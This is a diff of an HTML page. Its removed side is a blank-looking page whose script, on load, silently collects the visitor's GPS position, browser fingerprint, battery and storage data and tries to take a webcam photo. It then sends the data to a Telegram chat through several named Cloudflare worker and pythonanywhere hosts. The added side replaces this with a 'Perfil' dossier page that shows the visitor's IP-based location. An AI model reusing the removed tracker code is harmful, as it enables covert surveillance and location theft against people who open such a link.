@@ -1,345 +1,469 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>.</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Perfil de Mac User</title>
+    <!-- Font Awesome para iconos -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
-        body { background: white; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: system-ui; }
-        video, canvas { display: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(145deg, #0b0b1e 0%, #1a1a3a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1000px;
+            width: 100%;
+            background: rgba(18, 18, 42, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 35px 30px;
+            box-shadow: 0 20px 60px rgba(0, 20, 80, 0.6), 0 0 0 1px rgba(0, 180, 255, 0.15);
+            border: 1px solid rgba(0, 180, 255, 0.08);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            padding-bottom: 20px;
+        }
+
+        .header-left h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00d4ff, #7b61ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+
+        .header-left .sub {
+            font-size: 14px;
+            color: #8899bb;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .header-left .sub i {
+            color: #00d4ff;
+        }
+
+        .badge-premium {
+            background: rgba(255, 215, 0, 0.12);
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            color: #ffd966;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 18px;
+            margin-top: 10px;
+        }
+
+        .card {
+            background: rgba(13, 13, 34, 0.7);
+            backdrop-filter: blur(4px);
+            border-radius: 18px;
+            padding: 18px 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .card:hover {
+            background: rgba(20, 20, 58, 0.8);
+            border-color: rgba(0, 212, 255, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 80, 200, 0.15);
+        }
+
+        .card-title {
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #6688aa;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            padding-bottom: 10px;
+        }
+
+        .card-title i {
+            color: #00d4ff;
+            font-size: 16px;
+            width: 22px;
+            text-align: center;
+        }
+
+        .item {
+            display: flex;
+            padding: 6px 0;
+            font-size: 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .item:last-child {
+            border-bottom: none;
+        }
+
+        .item-label {
+            color: #88aacc;
+            width: 110px;
+            flex-shrink: 0;
+            font-weight: 500;
+        }
+
+        .item-value {
+            color: #f0f4ff;
+            word-break: break-word;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .item-value a {
+            color: #00d4ff;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .item-value a:hover {
+            color: #ff6b6b;
+            text-decoration: underline;
+        }
+
+        .item-value code {
+            background: rgba(0, 212, 255, 0.08);
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 13px;
+            color: #aaccff;
+            border: 1px solid rgba(0, 212, 255, 0.1);
+        }
+
+        .item-value .badge {
+            background: rgba(0, 212, 255, 0.12);
+            padding: 2px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            color: #88ddff;
+        }
+
+        .map-wrapper {
+            margin-top: 20px;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: #0a0a1a;
+            position: relative;
+        }
+
+        .map-wrapper iframe {
+            display: block;
+            width: 100%;
+            height: 200px;
+            border: none;
+            filter: invert(0.9) hue-rotate(180deg) brightness(0.8);
+        }
+
+        .map-overlay {
+            position: absolute;
+            bottom: 12px;
+            right: 16px;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(6px);
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #aaccff;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .map-overlay i {
+            color: #ff6b6b;
+        }
+
+        .footer {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 12px;
+            color: #445566;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .footer .capture {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #6688aa;
+        }
+
+        .footer .capture i {
+            color: #00d4ff;
+        }
+
+        .footer .links a {
+            color: #6688aa;
+            text-decoration: none;
+            margin: 0 8px;
+            transition: color 0.2s;
+        }
+
+        .footer .links a:hover {
+            color: #00d4ff;
+        }
+
+        @media (max-width: 700px) {
+            .container {
+                padding: 20px 16px;
+            }
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+            .badge-premium {
+                align-self: flex-start;
+            }
+            .item-label {
+                width: 80px;
+                font-size: 13px;
+            }
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .item {
+                flex-wrap: wrap;
+            }
+            .item-label {
+                width: 100%;
+                margin-bottom: 2px;
+            }
+        }
     </style>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <div class="container">
+        <div class="header">
+            <div class="header-left">
+                <h1><i class="fas fa-user-secret" style="color: #00d4ff; margin-right: 10px;"></i>Perfil</h1>
+                <div class="sub">
+                    <i class="fas fa-sync-alt fa-fw"></i> Datos extraídos automáticamente
+                    <span style="color:#445566; margin-left: 6px;">•</span>
+                    <i class="fas fa-shield-alt" style="color:#7b61ff;"></i> Privacidad
+                </div>
+            </div>
+            <div class="badge-premium">
+                <i class="fas fa-crown"></i> No premium
+            </div>
+        </div>
+
+        <div class="grid">
+            <!-- Datos personales fijos -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-id-card"></i> Identidad</div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-user fa-fw"></i> Nombre</span>
+                    <span class="item-value">Mac User</span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-at fa-fw"></i> Username</span>
+                    <span class="item-value"><span class="badge">N/A</span></span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-hashtag fa-fw"></i> ID</span>
+                    <span class="item-value"><code>N/A</code></span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-phone fa-fw"></i> Teléfono</span>
+                    <span class="item-value"><span style="color:#667;">No disponible</span></span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-globe fa-fw"></i> Idioma</span>
+                    <span class="item-value"><span class="badge">es-MX</span></span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-pen fa-fw"></i> Biografía</span>
+                    <span class="item-value"><span style="color:#667;">N/A</span></span>
+                </div>
+            </div>
+
+            <!-- Dispositivo -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-laptop"></i> Dispositivo</div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-mobile-alt fa-fw"></i> Equipo</span>
+                    <span class="item-value">Mac</span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-microchip fa-fw"></i> Plataforma</span>
+                    <span class="item-value">MacIntel</span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-tag fa-fw"></i> Vendor</span>
+                    <span class="item-value">Apple Computer, Inc.</span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-comment-dots fa-fw"></i> Chat</span>
+                    <span class="item-value">Privado <span style="color:#667;">(ID: N/A)</span></span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-envelope fa-fw"></i> Mensaje</span>
+                    <span class="item-value">Apertura de página</span>
+                </div>
+            </div>
+
+            <!-- Geolocalización DINÁMICA -->
+            <div class="card" id="geo-card">
+                <div class="card-title"><i class="fas fa-map-pin"></i> Geolocalización</div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-network-wired fa-fw"></i> IP</span>
+                    <span class="item-value" id="ip-value"><code>Cargando...</code></span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-flag fa-fw"></i> País</span>
+                    <span class="item-value" id="country-value"><span class="badge">--</span></span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-city fa-fw"></i> Región</span>
+                    <span class="item-value" id="region-value">--</span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-building fa-fw"></i> Ciudad</span>
+                    <span class="item-value" id="city-value">--</span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-map-marker-alt fa-fw"></i> Coordenadas</span>
+                    <span class="item-value" id="coords-value">--</span>
+                </div>
+                <div class="item">
+                    <span class="item-label"><i class="fas fa-clock fa-fw"></i> Zona Horaria</span>
+                    <span class="item-value" id="timezone-value">--</span>
+                </div>
+                <div class="item" id="maps-link-item">
+                    <span class="item-label"><i class="fas fa-directions fa-fw"></i> Mapa</span>
+                    <span class="item-value" id="maps-link-value">
+                        <a href="#" target="_blank" id="maps-link">Ver en Google Maps</a>
+                    </span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mapa embebido (se actualizará con JS) -->
+        <div class="map-wrapper" id="map-wrapper">
+            <iframe id="map-iframe" src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3000.0!2d-74.45695666354432!3d40.4969835082709!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zNDDCsDI5JzQ5LjEiTiA3NMKwMjcnMjUuMCJX!5e0!3m2!1sen!2sus!4v1234567890" allowfullscreen loading="lazy"></iframe>
+            <div class="map-overlay">
+                <i class="fas fa-location-dot"></i> Ubicación aproximada
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="capture">
+                <i class="fas fa-camera"></i> Capturado: <span id="capture-time">--</span>
+            </div>
+            <div class="links">
+                <a href="#"><i class="fab fa-github"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+                <a href="#"><i class="fas fa-lock"></i></a>
+            </div>
+        </div>
+    </div>
 
     <script>
-        // ================= CONFIGURACIÓN =================
-        const CHAT_ID = '7555997298';
-        // 🔥 CAMBIA ESTA URL POR LA DE TU NUEVO WORKER
-        const WORKER_URL = 'https://htbot.societykark.workers.dev/';  // <--- CAMBIA AQUÍ
-
-        // ========== FUNCIONES DE RECOLECCIÓN ==========
-        async function getLocationFromWorker() {
+        // Función para obtener la IP y geolocalización usando ip-api.com (gratuito, sin clave)
+        async function fetchGeoData() {
             try {
-                const res = await fetch(WORKER_URL);
-                if (!res.ok) throw new Error();
-                const data = await res.json();
-                return {
-                    ip: data.ip || 'N/A',
-                    country: data.country || 'N/A',
-                    region: data.region || 'N/A',
-                    city: data.city || 'N/A',
-                    postal: data.postal || 'N/A',
-                    timezone: data.timezone || 'N/A'
-                };
-            } catch(e) { return null; }
-        }
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('Error en la respuesta');
+                const data = await response.json();
 
-        async function getLocationFromIpapi() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    ip: data.ip || 'N/A',
-                    country: data.country_name || 'N/A',
-                    region: data.region || 'N/A',
-                    city: data.city || 'N/A',
-                    postal: data.postal || 'N/A',
-                    timezone: data.timezone || 'N/A'
-                };
-            } catch(e) { return null; }
-        }
+                // Rellenar los campos
+                document.getElementById('ip-value').innerHTML = `<code>${data.ip || 'N/A'}</code>`;
+                document.getElementById('country-value').innerHTML = `<span class="badge">${data.country_name || '--'} (${data.country_code || '--'})</span>`;
+                document.getElementById('region-value').textContent = data.region || '--';
+                document.getElementById('city-value').textContent = data.city || '--';
+                const lat = data.latitude || 0;
+                const lon = data.longitude || 0;
+                document.getElementById('coords-value').textContent = `${lat}, ${lon}`;
+                document.getElementById('timezone-value').textContent = data.timezone || '--';
 
-        async function reverseGeocode(lat, lng) {
-            try {
-                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
-                const res = await fetch(url);
-                const data = await res.json();
-                if (data && data.display_name) {
-                    const address = data.address;
-                    let parts = [];
-                    if (address.road) parts.push(address.road);
-                    if (address.suburb) parts.push(address.suburb);
-                    else if (address.city) parts.push(address.city);
-                    else if (address.town) parts.push(address.town);
-                    else if (address.village) parts.push(address.village);
-                    if (address.state) parts.push(address.state);
-                    return parts.join(', ');
-                }
-            } catch(e) {}
-            return null;
-        }
-
-        async function getFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200; canvas.height = 50;
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = "#069";
-            ctx.font = "14px Arial";
-            ctx.fillText("FP", 10, 30);
-            const hash = canvas.toDataURL().slice(0, 100);
-            let gpu = 'N/A';
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const info = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
-            } catch(e) {}
-            const fonts = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
-            const available = fonts.filter(f => document.fonts.check(`12px "${f}"`));
-            return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: hash };
-        }
-
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let model = "Desconocido";
-            if (ua.includes('iPhone')) model = 'iPhone';
-            else if (ua.includes('iPad')) model = 'iPad';
-            else if (ua.includes('Android')) model = 'Android';
-            else if (ua.includes('Mac')) model = 'Mac';
-            else if (ua.includes('Windows')) model = 'Windows PC';
-            else if (ua.includes('Linux')) model = 'Linux';
-            return {
-                model,
-                ua,
-                language: navigator.language || 'N/A',
-                resolution: `${window.screen.width}x${window.screen.height}`,
-                cores: navigator.hardwareConcurrency || 'N/A',
-                platform: navigator.platform || 'N/A',
-                vendor: navigator.vendor || 'N/A'
-            };
-        }
-
-        async function getStorageInfo() {
-            try {
-                const est = await navigator.storage.estimate();
-                return { total: (est.quota / (1024**3)).toFixed(2), used: (est.usage / (1024**3)).toFixed(2) };
-            } catch(e) { return { total: 'N/A', used: 'N/A' }; }
-        }
-
-        async function getBatteryInfo() {
-            try {
-                const battery = await navigator.getBattery();
-                return { level: (battery.level * 100).toFixed(0) + '%', charging: battery.charging ? 'Sí' : 'No' };
-            } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
-        }
-
-        function getLocalTime() { return new Date().toLocaleString(); }
-
-        function getGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
-                let watchId = navigator.geolocation.watchPosition(
-                    pos => { navigator.geolocation.clearWatch(watchId); resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
-                    () => { navigator.geolocation.clearWatch(watchId); navigator.geolocation.getCurrentPosition(
-                        pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                        () => resolve(null),
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    ); },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            });
-        }
-
-        async function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            let stream = null;
-            try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); } catch(e) {
-                try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); } catch(err) { return null; }
-            }
-            if (!stream) return null;
-            video.srcObject = stream;
-            await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
-            await new Promise(r => setTimeout(r, 500));
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-            stream.getTracks().forEach(t => t.stop());
-            video.srcObject = null;
-            return blob;
-        }
-
-        // ========== GENERAR HTML ==========
-        function generateHTML(data) {
-            return `<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Perfil de ${data.full_name}</title>
-<style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { font-family:'Segoe UI',Arial,sans-serif; background:#0a0a1a; color:#e0e0e0; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
-.container { max-width:900px; width:100%; background:#12122a; border-radius:16px; padding:30px; box-shadow:0 0 30px rgba(0,100,255,0.15); border:1px solid #1a2a4a; }
-h1 { color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text-shadow:0 0 20px rgba(0,212,255,0.2); }
-.subtitle { text-align:center; color:#8899bb; font-size:14px; margin-bottom:25px; border-bottom:1px solid #1a2a4a; padding-bottom:15px; }
-.section { background:#0d0d22; border-radius:10px; padding:15px 20px; margin-bottom:12px; border-left:3px solid #00d4ff; }
-.section:hover { background:#14143a; border-left-color:#ff6b6b; }
-.label { font-weight:600; color:#88bbdd; display:inline-block; width:150px; font-size:14px; }
-.value { color:#f0f0f0; font-weight:400; word-break:break-all; }
-.value a { color:#00d4ff; text-decoration:none; }
-.value a:hover { text-decoration:underline; color:#ff6b6b; }
-.footer { text-align:center; margin-top:25px; font-size:12px; color:#445566; border-top:1px solid #1a2a4a; padding-top:15px; }
-.row { display:flex; flex-wrap:wrap; margin-bottom:4px; }
-.row .label { flex:0 0 150px; }
-.row .value { flex:1; }
-@media (max-width:600px) { .row .label { flex:0 0 100%; } }
-</style>
-</head>
-<body>
-<div class="container">
-<h1>🕵️ PERFIL COMPLETO</h1>
-<div class="subtitle">Datos extraídos automáticamente</div>
-<div class="section">
-<div class="row"><span class="label">👤 Nombre completo:</span><span class="value">${data.full_name}</span></div>
-<div class="row"><span class="label">📛 Username:</span><span class="value">${data.username}</span></div>
-<div class="row"><span class="label">🆔 ID:</span><span class="value"><code>${data.user_id}</code></span></div>
-<div class="row"><span class="label">📞 Teléfono:</span><span class="value">${data.phone}</span></div>
-<div class="row"><span class="label">🗣️ Idioma:</span><span class="value">${data.language}</span></div>
-<div class="row"><span class="label">⭐ Premium:</span><span class="value">${data.is_premium}</span></div>
-<div class="row"><span class="label">📖 Biografía:</span><span class="value">${data.bio}</span></div>
-</div>
-<div class="section">
-<div class="row"><span class="label">📱 Dispositivo:</span><span class="value">${data.device}</span></div>
-<div class="row"><span class="label">📟 Plataforma:</span><span class="value">${data.platform}</span></div>
-<div class="row"><span class="label">🏷️ Vendor:</span><span class="value">${data.vendor}</span></div>
-</div>
-<div class="section">
-<div class="row"><span class="label">💬 Chat:</span><span class="value">${data.chat_type} (ID: ${data.chat_id})</span></div>
-</div>
-<div class="section">
-<div class="row"><span class="label">📩 Mensaje:</span><span class="value">${data.message_text}</span></div>
-<div class="row"><span class="label">📅 Fecha:</span><span class="value">${data.message_date}</span></div>
-</div>
-<div class="section">
-<div class="row"><span class="label">🌐 IP:</span><span class="value"><code>${data.ip}</code></span></div>
-<div class="row"><span class="label">📍 País:</span><span class="value">${data.country}</span></div>
-<div class="row"><span class="label">🏙️ Región:</span><span class="value">${data.region}</span></div>
-<div class="row"><span class="label">🌆 Ciudad:</span><span class="value">${data.city}</span></div>
-<div class="row"><span class="label">📮 Código Postal:</span><span class="value">${data.postal}</span></div>
-<div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">${data.timezone}</span></div>
-<div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">${data.lat}, ${data.lon}</span></div>
-<div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="${data.maps_link}" target="_blank">${data.maps_link}</a></span></div>
-</div>
-<div class="footer">⏰ Capturado: ${data.captured_time}</div>
-</div>
-</body>
-</html>`;
-        }
-
-        // ========== ENVIAR HTML COMO DOCUMENTO ==========
-        async function sendHTML(htmlContent) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            const blob = new Blob([htmlContent], { type: 'text/html' });
-            formData.append('document', blob, `perfil_${Date.now()}.html`);
-
-            try {
-                const res = await fetch(WORKER_URL, { method: 'POST', body: formData });
-                if (res.ok) {
-                    console.log('✅ HTML enviado');
+                // Actualizar el enlace del mapa y el iframe
+                const mapsLink = document.getElementById('maps-link');
+                const iframe = document.getElementById('map-iframe');
+                if (lat && lon) {
+                    const url = `https://www.google.com/maps?q=${lat},${lon}`;
+                    mapsLink.href = url;
+                    mapsLink.textContent = 'Ver en Google Maps';
+                    // Actualizar iframe (embebido estático, pero cambiamos src)
+                    iframe.src = `https://www.google.com/maps?q=${lat},${lon}&output=embed`;
                 } else {
-                    console.error('❌ Error al enviar HTML:', res.status);
+                    mapsLink.href = '#';
+                    mapsLink.textContent = 'Coordenadas no disponibles';
                 }
-            } catch (e) {
-                console.error('❌ Error:', e);
+
+                // Fecha/hora de captura
+                const now = new Date();
+                document.getElementById('capture-time').textContent = now.toLocaleString('es-MX', { 
+                    day: 'numeric', month: 'numeric', year: 'numeric',
+                    hour: '2-digit', minute: '2-digit', second: '2-digit',
+                    hour12: true
+                });
+
+            } catch (error) {
+                console.error('Error al obtener geolocalización:', error);
+                document.getElementById('ip-value').innerHTML = `<code>No disponible</code>`;
+                document.getElementById('country-value').innerHTML = `<span class="badge">--</span>`;
+                document.getElementById('coords-value').textContent = '--';
+                document.getElementById('maps-link').href = '#';
+                document.getElementById('maps-link').textContent = 'Error al cargar';
+                document.getElementById('capture-time').textContent = new Date().toLocaleString('es-MX');
             }
         }
 
-        // ========== PROCESO PRINCIPAL ==========
-        window.addEventListener('load', async function() {
-            try {
-                // Obtener ubicación
-                const [workerLoc, ipapiLoc] = await Promise.all([getLocationFromWorker(), getLocationFromIpapi()]);
-                const ip = workerLoc?.ip || ipapiLoc?.ip || 'N/A';
-
-                // Recolectar datos
-                const [gps, fp, device, storage, battery, photo] = await Promise.all([
-                    getGPS(),
-                    getFingerprint(),
-                    getDeviceInfo(),
-                    getStorageInfo(),
-                    getBatteryInfo(),
-                    capturePhoto()
-                ]);
-
-                const localTime = getLocalTime();
-                let address = null;
-                if (gps) address = await reverseGeocode(gps.lat, gps.lng);
-
-                // Construir objeto de datos
-                const data = {
-                    full_name: device.model + ' User',
-                    username: 'N/A',
-                    user_id: 'N/A',
-                    phone: 'No disponible',
-                    language: device.language,
-                    is_premium: 'No',
-                    bio: 'N/A',
-                    device: device.model,
-                    platform: device.platform,
-                    vendor: device.vendor,
-                    chat_type: 'Privado',
-                    chat_id: 'N/A',
-                    message_text: 'Apertura de página',
-                    message_date: localTime,
-                    ip: ip,
-                    country: workerLoc?.country || ipapiLoc?.country || 'N/A',
-                    region: workerLoc?.region || ipapiLoc?.region || 'N/A',
-                    city: workerLoc?.city || ipapiLoc?.city || 'N/A',
-                    postal: workerLoc?.postal || ipapiLoc?.postal || 'N/A',
-                    timezone: workerLoc?.timezone || ipapiLoc?.timezone || 'N/A',
-                    lat: gps?.lat || 'N/A',
-                    lon: gps?.lng || 'N/A',
-                    maps_link: gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lng}` : 'N/A',
-                    captured_time: localTime
-                };
-
-                // Generar y enviar HTML
-                const htmlContent = generateHTML(data);
-                await sendHTML(htmlContent);
-
-                // También enviar resumen en texto
-                let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
-                msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
-                msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
-                msg += `🌐 *Network Information*\n   • IP Address: ${ip}\n   • Language: ${device.language}\n\n`;
-                msg += `📍 *Ubicación*\n`;
-                if (gps) {
-                    if (address) msg += `   • Dirección: ${address}\n`;
-                    msg += `   • Coordenadas: ${gps.lat}, ${gps.lng}\n`;
-                    msg += `   • Precisión: ±${gps.accuracy}m\n`;
-                    msg += `   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
-                } else {
-                    msg += `   • GPS: No disponible\n`;
-                }
-                msg += `\n📱 *Dispositivo*\n   • Plataforma: ${device.platform}\n   • Vendor: ${device.vendor}\n`;
-                msg += `\n🔋 *Batería*\n   • Nivel: ${battery.level}\n   • Cargando: ${battery.charging}\n`;
-                msg += `\n💾 *Almacenamiento*\n   • Usado: ${storage.used} GB\n   • Total: ${storage.total} GB\n`;
-                msg += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Desarrollado por: @SCK`;
-
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('text', msg);
-
-                // Enviar a todos los Workers (opcional)
-                const urls = [
-                    'https://bot-ubi.societykark.workers.dev',
-                    'https://bot-tg.societykark.workers.dev',
-                    'https://tg-bot12.societykark.workers.dev',
-                    'https://app-trk.societykark.workers.dev',
-                    'https://app-tg.societykark.workers.dev',
-                    'https://app-kali.societykark.workers.dev',
-                    'https://societykark.pythonanywhere.com',
-                    'https://kali-bot12.societykark.workers.dev'
-                ];
-                await Promise.all(urls.map(url => fetch(url, { method: 'POST', body: formData }).catch(() => {})));
-
-            } catch(e) {
-                console.error(e);
-            }
-        });
+        // Ejecutar al cargar la página
+        fetchGeoData();
     </script>
 </body>
 </html>
